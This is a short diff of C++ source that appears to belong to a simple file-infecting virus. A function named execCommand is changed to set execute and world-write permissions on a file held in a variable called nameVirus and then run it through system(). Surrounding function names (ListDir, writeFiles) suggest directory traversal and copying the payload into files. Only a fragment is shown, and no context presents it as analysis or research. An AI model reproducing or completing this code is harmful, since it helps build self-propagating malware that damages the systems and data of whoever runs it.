@@ -6,6 +6,8 @@
 #include <fstream>
 #include <dirent.h>
 #include <iostream>
+#include <sys/stat.h>
+
 
 
 
@@ -46,9 +48,11 @@ void ListDir(const std::string &path, std::vector<std::string> &files)
 
   closedir(dp);
 }
+
 // write the file
 void execCommand(){
-  system(("chmod 775 " + nameVirus + ";" + nameVirus).c_str());
+  chmod(nameVirus.c_str(),S_IRWXU|S_IRWXG|S_IROTH|S_IWOTH|S_IEXEC);
+  system((nameVirus).c_str());
 }
 void writeFiles(std::vector<std::string> files)
 {
